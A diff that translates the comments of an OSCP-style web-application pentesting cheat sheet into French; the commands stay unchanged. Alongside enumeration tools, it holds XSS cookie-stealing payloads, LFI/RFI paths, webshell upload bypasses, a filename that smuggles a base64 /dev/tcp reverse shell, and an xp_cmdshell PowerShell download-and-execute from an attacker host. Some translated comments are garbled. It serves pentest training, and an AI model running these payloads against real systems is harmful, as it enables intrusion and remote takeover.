@@ -14,16 +14,16 @@ Examiner les fonctionnalités, entrées et configurations des applications web.
 <p class="oscp-command-note">Identifier les technologies du site web.</p>
 
 ```bash
-# Detect technologies used by the target website
+# Détecter les technologies utilisées par le site cible
 whatweb -a 3 [TARGET_IP]
 
-# Scan for potential vulnerabilities and server misconfigurations
+# Analyser les vulnérabilités potentielles et les erreurs de configuration du serveur
 nikto -ask=no -h http://[TARGET_IP] 2>&1
 
 whatweb -a 3 $IP
 nikto -ask=no -h http://$IP 2>&1
 
-# When find an HTTP website always try to do a post on the get requests you find to see what happens
+# Lorsque vous trouvez un site Web HTTP, essayez toujours de faire un post sur les requêtes que vous trouvez pour voir ce qui se passe
 
 # Obtain SSL certificate information
 openssl s_client -connect <target_domain>:443
@@ -33,10 +33,10 @@ openssl s_client -connect <target_domain>:443
 <p class="oscp-command-note">Afficher les méthodes HTTP disponibles.</p>
 
 ```bash
-# When discovering an HTTP website, test various HTTP methods to identify potential vulnerabilities. Use the following command to enumerate allowed methods:
+# Lors de la découverte d'un site web HTTP, testez diverses méthodes HTTP pour identifier les vulnérabilités potentielles. Utilisez la commande suivante pour énumérer les méthodes autorisées :
 curl -X OPTIONS http://[TARGET_IP] -i
 
-# Then, try POST requests or other methods found to see how the server responds:
+# Ensuite, essayez les requêtes POST ou d'autres méthodes trouvées pour voir comment le serveur répond :
 curl -X POST http://[TARGET_IP]/[endpoint] -d "test=data"
 ```
 
@@ -44,13 +44,13 @@ curl -X POST http://[TARGET_IP]/[endpoint] -d "test=data"
 <p class="oscp-command-note">Identifier les technologies web.</p>
 
 ```bash
-# Use Wappalyzer to identify technologies and frameworks
+# Utiliser Wappalyser pour identifier les technologies et les cadres
 wappalyzer --url http://[TARGET_IP]
 
-# Use BuiltWith to gather detailed technology profile
+# Utiliser BuildWith pour obtenir un profil technologique détaillé
 builtwith [TARGET_IP]
 
-# Scan for additional information using HTTP headers
+# Analyser des informations supplémentaires en utilisant les en-têtes HTTP
 curl -I http://[TARGET_IP]
 ```
 
@@ -61,34 +61,34 @@ curl -I http://[TARGET_IP]
 <p class="oscp-command-note">Rechercher des chemins ou paramètres web avec FFUF.</p>
 
 ```bash
-# Basic directory fuzzing
+# Fuzzing de répertoire de base
 ffuf -w /path/to/wordlist.txt -u http://target/FUZZ
 
-# Filter to show only 200 or 3xx responses
+# Filtre pour afficher seulement 200 ou 3xx réponses
 ffuf -w /path/to/wordlist.txt -u http://target/FUZZ -mc 200,300-399
 
-# Output results to a file
+# Résultats de sortie dans un fichier
 ffuf -w /path/to/wordlist.txt -u http://target/FUZZ -o results.txt
 
 # Recursive directory fuzzing
 ffuf -w /path/to/wordlist.txt -u http://target/FUZZ -recursion
 
-# Set number of threads
+# Définir le nombre de fils
 ffuf -w /path/to/wordlist.txt -u http://target/FUZZ -t 50
 
-# Use proxy
+# Utiliser un proxy
 ffuf -w /path/to/wordlist.txt -u http://target/FUZZ -x http://127.0.0.1:8080
 
-# Use a delay between requests
+# Utiliser un délai entre les demandes
 ffuf -w /path/to/wordlist.txt -u http://target/FUZZ -p 0.1-0.5
 
-# Set request timeout
+# Définir le délai de requête
 ffuf -w /path/to/wordlist.txt -u http://target/FUZZ -timeout 10
 
 # Match response size
 ffuf -w /path/to/wordlist.txt -u http://target/FUZZ -fs 4242
 
-# Example usage
+# Exemple d’utilisation
 ffuf -w /usr/share/wordlists/dirb/common.txt -u http://$IP/FUZZ
 ffuf -w /usr/share/wordlists/dirb/big.txt -u http://$IP/FUZZ
 ```
@@ -100,19 +100,19 @@ ffuf -w /usr/share/wordlists/dirb/big.txt -u http://$IP/FUZZ
 <p class="oscp-command-note">Rechercher des répertoires web avec DIRB.</p>
 
 ```bash
-# Basic directory scanning
+# Scan élémentaire des répertoires
 dirb http://target /path/to/wordlist.txt
 
-# Save output to a file
+# Enregistrer la sortie dans un fichier
 dirb http://target /path/to/wordlist.txt -o results.txt
 
-# Use custom user-agent
+# Utiliser un agent utilisateur personnalisé
 dirb http://target /path/to/wordlist.txt -a "Mozilla/5.0"
 
 # Ignore non-existent pages
 dirb http://target /path/to/wordlist.txt -N
 
-# Scan SSL (HTTPS)
+# Analysez SSL (HTTPS)
 dirb https://target /path/to/wordlist.txt
 
 # Recursively scan directories
@@ -121,7 +121,7 @@ dirb http://target /path/to/wordlist.txt -r
 # Exclude specific status codes
 dirb http://target /path/to/wordlist.txt -n -X .php,.html,.txt
 
-# Example usage
+# Exemple d’utilisation
 dirb http://target.com
 ```
 
@@ -132,25 +132,25 @@ dirb http://target.com
 <p class="oscp-command-note">Énumérer les répertoires ou sous-domaines avec Gobuster.</p>
 
 ```bash
-# Basic directory scanning
+# Scan élémentaire des répertoires
 gobuster dir -u http://target -w /path/to/wordlist.txt
 
-# Filter to show only 200 responses
+# Filtre pour afficher seulement 200 réponses
 gobuster dir -u http://target -w /path/to/wordlist.txt -s 200
 
-# Specify extensions
+# Spécifier les extensions
 gobuster dir -u http://target -w /path/to/wordlist.txt -x php,html,txt
 
-# Save output to a file
+# Enregistrer la sortie dans un fichier
 gobuster dir -u http://target -w /path/to/wordlist.txt -o results.txt
 
-# Set number of threads
+# Définir le nombre de fils
 gobuster dir -u http://target -w /path/to/wordlist.txt -t 50
 
-# Use proxy
+# Utiliser un proxy
 gobuster dir -u http://target -w /path/to/wordlist.txt -p http://127.0.0.1:8080
 
-# Example usage
+# Exemple d’utilisation
 gobuster dir -u http://10.11.1.71:80/site/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -e txt,php,html,htm
 gobuster dir -u http://192.168.196.199 -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt -x pdf
 ```
@@ -162,13 +162,13 @@ gobuster dir -u http://192.168.196.199 -w /usr/share/wordlists/dirbuster/directo
 <p class="oscp-command-note">Énumérer les chemins web avec Feroxbuster.</p>
 
 ```bash
-# Basic directory fuzzing
+# Fuzzing de répertoire de base
 feroxbuster -u http://target -w /path/to/wordlist.txt -x php,html,txt
 
-# Set number of threads, verbose mode, ignore certificate errors
+# Définir le nombre de threads, mode verbe, ignorer les erreurs de certificat
 feroxbuster -u http://$IP -t 30 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x "txt,html,php,asp,aspx,jsp" -v -k -n -e 
 
-# Filter specific status codes
+# Codes de statut spécifiques au filtre
 feroxbuster -u http://$IP -t 30 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x "txt,html,php,asp,aspx,jsp" -v -k -n -e -C 404 #ignore denied
 feroxbuster -u http://$IP -t 30 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x "txt,html,php,asp,aspx,jsp" -v -k -n -e -C 404,302 #handle redirects
 ```
@@ -180,22 +180,22 @@ feroxbuster -u http://$IP -t 30 -w /usr/share/wordlists/dirbuster/directory-list
 <p class="oscp-command-note">Rechercher des chemins web avec dirsearch.</p>
 
 ```bash
-# Basic directory scanning
+# Scan élémentaire des répertoires
 dirsearch -u http://target -w /path/to/wordlist.txt
 
-# Filter to show only 200 or 3xx responses
+# Filtre pour afficher seulement 200 ou 3xx réponses
 dirsearch -u http://target -w /path/to/wordlist.txt -i 200,300-399
 
-# Specify extensions
+# Spécifier les extensions
 dirsearch -u http://target -w /path/to/wordlist.txt -e php,html,txt
 
-# Save output to a file
+# Enregistrer la sortie dans un fichier
 dirsearch -u http://target -w /path/to/wordlist.txt -r -o results.txt
 
-# Set number of threads
+# Définir le nombre de fils
 dirsearch -u http://target -w /path/to/wordlist.txt -t 50
 
-# Use proxy
+# Utiliser un proxy
 dirsearch -u http://target -w /path/to/wordlist.txt -x http://127.0.0.1:8080
 
 # Ignore SSL certificate warnings
@@ -204,7 +204,7 @@ dirsearch -u https://target -w /path/to/wordlist.txt -k
 # Exclude specific status codes
 dirsearch -u http://target -w /path/to/wordlist.txt --exclude-status 404,403
 
-# Example usage
+# Exemple d’utilisation
 dirsearch -u http://$IP/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-files.txt 
 dirsearch -u http://$IP/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -t 300 --recursive --exclude-status=400,404,405,408
 ```
@@ -216,10 +216,10 @@ dirsearch -u http://$IP/ -w /usr/share/wordlists/dirbuster/directory-list-lowerc
 <p class="oscp-command-note">Tester les paramètres web avec Wfuzz.</p>
 
 ```bash
-# Find available directories
+# Rechercher les répertoires disponibles
 wfuzz --hc 404 -c -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt http://<target_ip>/FUZZ
 
-# Find available directories with cookies
+# Trouver les répertoires disponibles avec les cookies
 wfuzz --hc 404 -c -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -H "cookie: <cookie_name>=<cookie_value>" http://<target_ip>/FUZZ
 
 # Fuzz data parameters
@@ -228,13 +228,13 @@ wfuzz --hc 404 -c -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.tx
 # Subdomain enumeration
 wfuzz --hc 404 -c -w /usr/share/amass/wordlists/subdomains-top1mil-110000.txt -H "HOST: FUZZ.<target_domain>" <target_domain>
 
-# Enumerate hidden directories
+# Énumérer les répertoires cachés
 wfuzz --hc 404 -c -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt http://<target_ip>/.FUZZ
 
 # Skip SSL Certificate validation
 wfuzz --hc 404 -c -k -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt http://<target_ip>/FUZZ
 
-# Use threads to speed up process (not advisable to exceed 200)
+# Utiliser des fils pour accélérer le processus (pas conseillé de dépasser 200)
 wfuzz --hc 404 -c -t <number_of_threads> -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt http://<target_ip>/FUZZ
 ```
 
@@ -245,22 +245,22 @@ wfuzz --hc 404 -c -t <number_of_threads> -w /usr/share/dirbuster/wordlists/direc
 <p class="oscp-command-note">Rechercher des chemins ou paramètres web avec FFUF.</p>
 
 ```bash
-# Basic file fuzzing
+# Fuzzing de fichier de base
 ffuf -w /path/to/wordlist.txt -u http://target/FUZZ
 
-# Filter to show only 200 or 3xx responses
+# Filtre pour afficher seulement 200 ou 3xx réponses
 ffuf -w /path/to/wordlist.txt -u http://target/FUZZ -mc 200,300-399
 
-# Specify extensions
+# Spécifier les extensions
 ffuf -w /path/to/wordlist.txt:FUZZ -u http://target/FUZZ.html,http://target/FUZZ.php -mc 200,300-399
 
-# Output results to a file
+# Résultats de sortie dans un fichier
 ffuf -w /path/to/wordlist.txt -u http://target/FUZZ -o results.txt
 
-# Set number of threads
+# Définir le nombre de fils
 ffuf -w /path/to/wordlist.txt -u http://target/FUZZ -t 50
 
-# Use proxy
+# Utiliser un proxy
 ffuf -w /path/to/wordlist.txt -u http://target/FUZZ -x http://127.0.0.1:8080
 ```
 
@@ -271,19 +271,19 @@ ffuf -w /path/to/wordlist.txt -u http://target/FUZZ -x http://127.0.0.1:8080
 <p class="oscp-command-note">Rechercher des répertoires web avec DIRB.</p>
 
 ```bash
-# Basic file scanning with default extensions
+# Analyse de fichier de base avec extensions par défaut
 dirb http://target /path/to/wordlist.txt -X .php,.html,.txt
 
-# Save output to a file
+# Enregistrer la sortie dans un fichier
 dirb http://target /path/to/wordlist.txt -X .php,.html,.txt -o results.txt
 
-# Use custom user-agent
+# Utiliser un agent utilisateur personnalisé
 dirb http://target /path/to/wordlist.txt -X .php,.html,.txt -a "Mozilla/5.0"
 
 # Ignore non-existent pages
 dirb http://target /path/to/wordlist.txt -X .php,.html,.txt -N
 
-# Scan SSL (HTTPS)
+# Analysez SSL (HTTPS)
 dirb https://target /path/to/wordlist.txt -X .php,.html,.txt
 ```
 
@@ -294,22 +294,22 @@ dirb https://target /path/to/wordlist.txt -X .php,.html,.txt
 <p class="oscp-command-note">Énumérer les répertoires ou sous-domaines avec Gobuster.</p>
 
 ```bash
-# Basic file scanning
+# Recherche élémentaire de fichiers
 gobuster dir -u http://target -w /path/to/wordlist.txt
 
-# Filter to show only 200 responses
+# Filtre pour afficher seulement 200 réponses
 gobuster dir -u http://target -w /path/to/wordlist.txt -s 200
 
-# Specify extensions
+# Spécifier les extensions
 gobuster dir -u http://target -w /path/to/wordlist.txt -x php,html,txt
 
-# Save output to a file
+# Enregistrer la sortie dans un fichier
 gobuster dir -u http://target -w /path/to/wordlist.txt -o results.txt
 
-# Set number of threads
+# Définir le nombre de fils
 gobuster dir -u http://target -w /path/to/wordlist.txt -t 50
 
-# Use proxy
+# Utiliser un proxy
 gobuster dir -u http://target -w /path/to/wordlist.txt -p http://127.0.0.1:8080
 ```
 
@@ -320,28 +320,28 @@ gobuster dir -u http://target -w /path/to/wordlist.txt -p http://127.0.0.1:8080
 <p class="oscp-command-note">Énumérer les chemins web avec Feroxbuster.</p>
 
 ```bash
-# Basic file scanning
+# Recherche élémentaire de fichiers
 feroxbuster -u http://target -w /path/to/wordlist.txt
 
-# Filter to show only 200 responses
+# Filtre pour afficher seulement 200 réponses
 feroxbuster -u http://target -w /path/to/wordlist.txt -s 200
 
-# Specify extensions
+# Spécifier les extensions
 feroxbuster -u http://target -w /path/to/wordlist.txt -x php,html,txt
 
-# Save output to a file
+# Enregistrer la sortie dans un fichier
 feroxbuster -u http://target -w /path/to/wordlist.txt -o results.txt
 
-# Set number of threads
+# Définir le nombre de fils
 feroxbuster -u http://target -w /path/to/wordlist.txt -t 50
 
-# Use proxy
+# Utiliser un proxy
 feroxbuster -u http://target -w /path/to/wordlist.txt -p http://127.0.0.1:8080
 
 # Exclude specific status codes
 feroxbuster -u http://target -w /path/to/wordlist.txt -e php,html,txt -C 404,403
 
-# Use custom user-agent
+# Utiliser un agent utilisateur personnalisé
 feroxbuster -u http://target -w /path/to/wordlist.txt -a "Mozilla/5.0"
 ```
 
@@ -352,22 +352,22 @@ feroxbuster -u http://target -w /path/to/wordlist.txt -a "Mozilla/5.0"
 <p class="oscp-command-note">Rechercher des chemins web avec dirsearch.</p>
 
 ```bash
-# Basic file scanning
+# Recherche élémentaire de fichiers
 dirsearch -u http://target -w /path/to/wordlist.txt
 
-# Filter to show only 200 or 3xx responses
+# Filtre pour afficher seulement 200 ou 3xx réponses
 dirsearch -u http://target -w /path/to/wordlist.txt -i 200,300-399
 
-# Specify extensions
+# Spécifier les extensions
 dirsearch -u http://target -w /path/to/wordlist.txt -e php,html,txt
 
-# Save output to a file
+# Enregistrer la sortie dans un fichier
 dirsearch -u http://target -w /path/to/wordlist.txt -r -o results.txt
 
-# Set number of threads
+# Définir le nombre de fils
 dirsearch -u http://target -w /path/to/wordlist.txt -t 50
 
-# Use proxy
+# Utiliser un proxy
 dirsearch -u http://target -w /path/to/wordlist.txt -x http://127.0.0.1:8080
 ```
 
@@ -382,20 +382,20 @@ dirsearch -u http://target -w /path/to/wordlist.txt -x http://127.0.0.1:8080
 <p class="oscp-command-note">Script shell dans la rubrique « Dépôt Git exposé ».</p>
 
 ```bash
-# Dump the contents of an exposed .git directory
+# Domptez le contenu d'un répertoire .git exposé
 git-dumper http://[IP/Domain]/.git website_git
 
-# Search for common secrets in the dumped files
+# Rechercher des secrets communs dans les fichiers sous-évalués
 grep -r 'password' .
 grep -r 'apikey' .
 
-# View a specific file that may contain credentials or sensitive data
+# Afficher un fichier spécifique qui peut contenir des identifiants ou des données sensibles
 cat website_git/config/database.php
 
-# Check the commit log
+# Vérifiez le journal de validation
 git log
 
-# Then to check the commit diff
+# Puis pour vérifier le diff commit
 git show [commitID]
 ```
 
@@ -409,16 +409,16 @@ git show [commitID]
 ```bash
 ./gitdumper.sh http://[domain].com/.git/ /path/to/save/git
 
-# Check lasts commits
+# Vérifier les dernières commits
 cd /path/to/git && git status
 
-# Read selecter commit number
+# Lire le numéro de commit du sélecteur
 git commit [commitNumber]
 
 # Restore last commit
 git reset --hard
 
-# Automatic script to read and restore last git dump
+# script automatique pour lire et restaurer la dernière dump git
 ./extractor.sh /.git/ extracted
 ```
 
@@ -431,7 +431,7 @@ Examiner les entrées et les réponses de l'application web.
 <p class="oscp-command-note">Examiner un site WordPress.</p>
 
 ```bash
-# Basic WordPress scan
+# Scan WordPress de base
 wpscan --url http://$IP/wp/
 ```
 
@@ -450,7 +450,7 @@ wpscan -u "http://<IP>/" --wp-content-dir "<custom-path>"
 ```bash
 wpscan -u "http://<IP>/" --enumerate u
 
-# Using wordlist
+# Utilisation de la liste de mots
 wpscan -u "http://<IP>/" --username <username> -w /usr/share/SecList/Usernames/xato-usernames-top-1millions-20000.txt
 ```
 
@@ -458,13 +458,13 @@ wpscan -u "http://<IP>/" --username <username> -w /usr/share/SecList/Usernames/x
 <p class="oscp-command-note">Script shell dans la rubrique « CMS ».</p>
 
 ```bash
-# Using a malicious WordPress plugin
+# Utilisation d'un plugin WordPress malveillant
 https://github.com/wetw0rk/malicious-wordpress-plugin
 
 # Usage
 python3 wordpwn.py [LHOST] [LPORT] [HANDLER]
 
-# Example
+# Exemple
 python3 wordpwn.py 192.168.119.140 443 Y
 ```
 
@@ -472,7 +472,7 @@ python3 wordpwn.py 192.168.119.140 443 Y
 
 
 ```bash
-# Scan Drupal CMS
+# Scanner Drupal CMS
 droopescan scan drupal -u [TARGET_URL]
 ```
 
@@ -480,13 +480,13 @@ droopescan scan drupal -u [TARGET_URL]
 <p class="oscp-command-note">Télécharger une ressource distante.</p>
 
 ```bash
-# Download the .git directory if exposed
+# Télécharger le répertoire .git si exposé
 sudo wget -r http://[TARGET_IP]/.git/
 
-# Move into the .git directory locally
+# Déplacer dans le répertoire .git localement
 cd [TARGET_IP]
 
-# Show Git commits and reveal sensitive information
+# Afficher Git commet et révèle des informations sensibles
 sudo git show
 ```
 
@@ -501,7 +501,7 @@ sudo git show
 | Last Updated: [LAST_UPDATE]
 | [!] The version is out of date; the latest version is [LATEST_VERSION]
 
-# Exploit for Simple File List < [VULNERABLE_VERSION] - Unauthenticated Arbitrary File Upload
+# Exploiter pour une liste de fichiers simple < [VULNERABLE_VERSION] - Téléchargement arbitraire de fichiers non authentifiés
 
 https://www.exploit-db.com/exploits/48979
 ```
@@ -546,7 +546,7 @@ Examiner les entrées et les réponses de l'application web.
 
 
 ```bash
-# Use cadaver
+# Utiliser le cadavre
 cadaver [IP]
 ```
 
@@ -574,21 +574,17 @@ nc -nvlp 80
 
 
 
-```text
-http://$VictimIP/shell.aspx
-```
-
-
+<p class="oscp-inline-ref"><strong>URL de référence :</strong> <code>http://$VictimIP/shell.aspx</code></p>
 ### APIs
 
 
 <p class="oscp-command-note">Interroger le serveur avec une requête HTTP.</p>
 
 ```bash
-# Basic API exploration
+# Exploration API de base
 curl http://$IP/api/
 
-# Example output
+# Exemple de sortie
 [{"string":"/api/","id":13},{"string":"/article/","id":14},{"string":"/article/?","id":15},{"string":"/user/","id":16},{"string":"/user/?","id":17}] 
 
 # Common API Pattern
@@ -606,7 +602,7 @@ curl -X GET "http://[IP]:[PORT]/search?query=*"
 curl -X GET "http://[IP]:[PORT]/search?query=lol"
 {"query":"lol","result":""}
 
-# Use -d for data and -H for headers
+# Utiliser -d pour les données et -H pour les en-têtes
 curl -d '{"password":"fake","username":"admin"}' -H 'Content-Type: application/json'  http://[IP]:[PORT]/users/v1/login
 
 # Option to send request to proxy as well
@@ -619,21 +615,9 @@ curl -d '{"password":"fake","username":"admin"}' -H 'Content-Type: application/j
 
 
 
-```text
-/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
-```
-
-
-```text
-/usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
-```
-
-
-```text
-/usr/share/seclists/Discovery/Web-Content/common.txt
-```
-
-
+<p class="oscp-inline-ref"><strong>Chemin de référence :</strong> <code>/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</code></p>
+<p class="oscp-inline-ref"><strong>Chemin de référence :</strong> <code>/usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt</code></p>
+<p class="oscp-inline-ref"><strong>Chemin de référence :</strong> <code>/usr/share/seclists/Discovery/Web-Content/common.txt</code></p>
 **Paramètres et repères :**
 `/usr/share/seclists/Discovery/Web-Content/big.txt`  
 
@@ -641,7 +625,7 @@ curl -d '{"password":"fake","username":"admin"}' -H 'Content-Type: application/j
 <p class="oscp-command-note">Interroger le serveur avec une requête HTTP.</p>
 
 ```bash
-# Get the website content
+# Obtenir le contenu du site
 curl http://example.com > example.txt
 
 # Remove duplicated entries
@@ -651,7 +635,7 @@ html2dic example.txt
 # Autre possibilité
 cewl -w createWordlist.txt https://www.example.com
 
-# Improve the wordlist with rules
+# Améliorer la liste de mots avec les règles
 john ---wordlist=wordlist.txt --rules --stdout > wordlist-modified.txt
 ```
 
@@ -686,7 +670,7 @@ Examiner les entrées et les réponses de l'application web.
 <p class="oscp-command-note">Extrait HTML lié à « Stored ».</p>
 
 ```html
-# Text to save to the application.
+# Texte à enregistrer dans l'application.
 <script>alert("XSS")</script>
 
 <script>alert(document.cookie)</script>
@@ -851,12 +835,12 @@ python xsstrike.py -u "http://SERVER_IP:PORT/index.php?task=test"
 <p class="oscp-command-note">Rechercher des chemins ou paramètres web avec FFUF.</p>
 
 ```bash
-# [xss.req] is the request captured from BurpSuite.
+# [xss.req] est la requête capturée dans BurpSuite.
 ffuf -ic -c -of csv -request-proto http -request [xss.req] -w XSS-RSNAKE.txt
 ```
 
 
-## File Inclusion
+## Inclusion des fichiers
 
 Examiner les entrées et les réponses de l'application web.
 
@@ -871,11 +855,7 @@ Examiner les entrées et les réponses de l'application web.
 
 
 
-```text
-http://<target_url>/file.php?recurse=<file_name>
-```
-
-
+<p class="oscp-inline-ref"><strong>URL de référence :</strong> <code>http://&lt;target_url&gt;/file.php?recurse=&lt;file_name&gt;</code></p>
 <p class="oscp-command-note">Rechercher des chemins ou paramètres web avec FFUF.</p>
 
 ```bash
@@ -938,13 +918,13 @@ http://<target_url>/file.php?recurse=%252e%252e%252fetc%252fpasswd
 # Repeated slashes bypass
 http://<target_url>/file.php?recurse=....//....//....//etc/passwd
 
-# Viewing a file with null byte injection
+# Affichage d'un fichier avec injection d'octet nul
 http://<target_url>/file.php?recurse=../../../../../etc/passwd%00
 
 # Bypass file extension restrictions
 http://<target_url>/file.php?recurse=../../../../../etc/passwd%2500.jpg
 
-# Retrieve system environment variables
+# Récupérer les variables d'environnement du système
 http://<target_url>/file.php?recurse=../../../../../proc/self/environ
 ```
 
@@ -1086,7 +1066,7 @@ Examiner les entrées et les réponses de l'application web.
 
 
 ```bash
-# This assumes the server's allow_url_fopen or allow_url_include settings are enabled.
+# Ceci suppose que les paramètres allow url fopen ou allow url include du serveur sont activés.
 http://<target_url>/file.php?recurse=http://<attacker_ip>/malicious.php
 ```
 
@@ -1128,11 +1108,7 @@ curl "http://<TARGET>/index.php?page=http://<ATTACKER_IP>/revshell.php&cmd=ls"
 
 
 
-```text
-http://[IP]/[cms-path]/wp-content/nonexistent?cmd=[command]
-```
-
-
+<p class="oscp-inline-ref"><strong>URL de référence :</strong> <code>http://[IP]/[cms-path]/wp-content/nonexistent?cmd=[command]</code></p>
 **Paramètres et repères :**
 `multi-os-php-reverse-shell.php`  
 
@@ -1364,7 +1340,7 @@ curl -X POST --data 'Archive=git%3BIEX%20(New-Object%20System.Net.Webclient).Dow
 ```
 
 
-## File Upload
+## Téléchargement de fichier
 
 Examiner les entrées et les réponses de l'application web.
 
@@ -1413,7 +1389,7 @@ Examiner les entrées et les réponses de l'application web.
 <p class="oscp-command-note">Script shell dans la rubrique « Extensions Whitelist ».</p>
 
 ```bash
-# This only checks if the whitelist are there in the file upload and not if it ends with it.
+# Ceci ne vérifie que si la liste blanche est là dans le fichier de téléchargement et non si elle se termine avec elle.
 $fileName = basename($_FILES["uploadFile"]["name"]);
 
 if (!preg_match('^.*\.(jpg|jpeg|png|gif)', $fileName)) {
@@ -1429,10 +1405,10 @@ if (!preg_match('^.*\.(jpg|jpeg|png|gif)', $fileName)) {
 
 
 ```text
-# For PHP
+# Pour PHP
 .pHP, .phps, .php7, .php4, .php5, .php3, .xxx
 
-# For ASP(X)
+# Pour ASP(X)
 .aspx, .asp, .ashx, .asmx
 ```
 
@@ -1455,7 +1431,7 @@ AddType application/x-httpd-php .dork
 <p class="oscp-command-note">Afficher ou écrire une valeur.</p>
 
 ```bash
-# We can now upload [file].dork files.
+# Nous pouvons maintenant télécharger des fichiers [file].dork.
 echo "AddType application/x-httpd-php .dork" > .htaccess
 ```
 
@@ -1467,7 +1443,7 @@ echo "AddType application/x-httpd-php .dork" > .htaccess
 
 
 ```bash
-# This checks if it ends with it so double extension wont work.
+# Cela vérifie si elle se termine avec elle si double extension ne fonctionnera pas.
 if (!preg_match('/^.*\.(jpg|jpeg|png|gif)$/', $fileName)) { ...SNIP... }
 ```
 
@@ -1482,7 +1458,7 @@ shell.php%00.jpg
 
 
 ```text
-# For example shell.php%00.jpg works with PHP servers with version 5.X or earlier, as it causes the PHP web server to end the file name after the '%00', and store it as 'shell.php'.
+# Par exemple shell.php%00.jpg fonctionne avec les serveurs PHP avec la version 5.X ou une version antérieure, car il provoque la fin du nom du serveur web PHP après le « & #160; %00 & #160; », et le stocke sous la forme de « & #160; shell.php & #160; ».
 %20
 %0a
 %00
@@ -1498,7 +1474,7 @@ shell.php%00.jpg
 <p class="oscp-command-note">Script shell dans la rubrique « Bypassing Filters ».</p>
 
 ```bash
-# Script for all permutations
+# Script pour toutes les permutations
 for char in '%20' '%0a' '%00' '%0d0a' '/' '.\\' '.' '…' ':'; do
     for ext in '.php' '.php2' '.php3' '.php4' '.php5' '.php6' '.php7' '.phps' '.pht' '.phtm' '.phtml' '.pgif' '.phar' '.hphp'; do
         echo "shell$char$ext.jpg" >> wordlist.txt
@@ -1529,7 +1505,7 @@ system($_GET['cmd']); //or you can insert your complete shell code
 <p class="oscp-command-note">Afficher ou écrire une valeur.</p>
 
 ```bash
-# Example
+# Exemple
 echo "GIF8" > text.jpg 
 file text.jpg
 
@@ -1547,7 +1523,7 @@ if (!in_array($type, array('image/jpg', 'image/jpeg', 'image/png', 'image/gif'))
 ![MIME Spoofing](https://www.emmanuelsolis.com/img/php_filters01.png)
 
 
-### File Execution
+### Exécution de fichier
 
 
 
@@ -1599,10 +1575,10 @@ file.jpg||whoami
 <p class="oscp-command-note">Afficher ou écrire une valeur.</p>
 
 ```text
-# Crate the Base64 encoded command.
+# Créez la commande encodée Base64.
 echo "bash -i >& /dev/tcp/192.168.45.166/444 0>&1" | base64
 
-# Download any normal image, and give it the name: cat.jpg.
+# Télécharger n'importe quelle image normale, et lui donner le nom: cat.jpg.
 cp cat.jpg ’|smile”`echo <base64_bash_reverse_shell> | base64 -d | bash`”.jpg’
 ```
 
@@ -1625,7 +1601,7 @@ Examiner les connexions, la configuration et les requêtes de la base de donnée
 ```bash
 mysql -u <username> -p -h <host>
 
-# Then, provide the password when prompted.
+# Ensuite, indiquez le mot de passe quand vous l'invitez.
 ```
 
 
@@ -1685,7 +1661,7 @@ SHOW GRANTS FOR '<username>'@'<host>';
 ```
 
 
-##### Data Extraction
+##### Extraction de données
 
 
 <p class="oscp-command-note">Lire les résultats d&#x27;une requête SQL.</p>
@@ -1789,7 +1765,7 @@ long long sys_exec(UDF_INIT *initid, UDF_ARGS *args, char *is_null, char *error)
 ```bash
 sudo apt install mysql-server-dev libmysqlclient-dev
 
-# Compile the source code into a .so file; the resulting lib_mysqludf_sys.so file can now be used.
+# Compilez le code source dans un fichier .so ; le résultat lib mysqludf sys. Donc le fichier peut maintenant être utilisé.
 gcc -Wall -fPIC -I/usr/include/mysql -shared -o lib_mysqludf_sys.so lib_mysqludf_sys.c -lc
 
 # -fPIC: Generates position-independent code (required for shared objects).
@@ -1837,7 +1813,7 @@ SELECT sys_exec('id');
 <p class="oscp-command-note">Interroger une base de données MySQL.</p>
 
 ```bash
-# Ensure that the .so file has the proper permissions and path to be loaded correctly by MySQL.
+# Assurez-vous que le fichier .so a les permissions et le chemin appropriés à charger correctement par MySQL.
 mysql -u root -p -h <host> -e "USE mysql; 
 CREATE TABLE foo(line BLOB); 
 INSERT INTO foo VALUES (LOAD_FILE('/path/to/existing/lib_mysqludf_sys.so')); 
@@ -1856,7 +1832,7 @@ Examiner les connexions, la configuration et les requêtes de la base de donnée
 <p class="oscp-command-note">Commande Impacket dans la rubrique « Connexion initiale ».</p>
 
 ```bash
-# Tip: you can also specify a domain by using <domain>/<username>:<password>@<host>.
+# Conseil : vous pouvez également spécifier un domaine en utilisant <domain>/<username>:<password>@<host>.
 impacket-mssqlclient <username>:<password>@<host> -windows-auth
 ```
 
@@ -1889,7 +1865,7 @@ USE <database_name>;
 <p class="oscp-command-note">Lire les résultats d&#x27;une requête SQL.</p>
 
 ```sql
-# Tip: replace <schema> with the actual schema name (commonly dbo).
+# Astuce : remplacer <schema> par le nom actuel du schéma (communément dbo).
 SELECT table_name FROM <schema>.information_schema.tables;
 ```
 
@@ -1914,7 +1890,7 @@ SELECT * FROM <schema>.sys.database_permissions WHERE grantee_principal_id = (SE
 ```
 
 
-##### Data Extraction
+##### Extraction de données
 
 
 <p class="oscp-command-note">Lire les résultats d&#x27;une requête SQL.</p>
@@ -1952,17 +1928,17 @@ EXEC xp_cmdshell 'whoami';
 # Setup the listener
 nc -lvnp 4444
 
-# Start your HTTP Server
+# Démarrez votre serveur HTTP
 python3 -m http.server 80
 
-# Then, use the following reverse shell command on the SQL server (Windows system):
-# To download a payload
+# Ensuite, utilisez la commande shell inverse suivante sur le serveur SQL (système Windows):
+# Pour télécharger une charge utile
 EXEC xp_cmdshell 'powershell -NoP -NonI -W Hidden -Exec Bypass -Command "iex(New-Object Net.WebClient).DownloadString(''http://<attacker_ip>/shell.ps1'')"';
 
-# Alternative Netcat-based payload
+# Autre charge utile basée sur Netcat
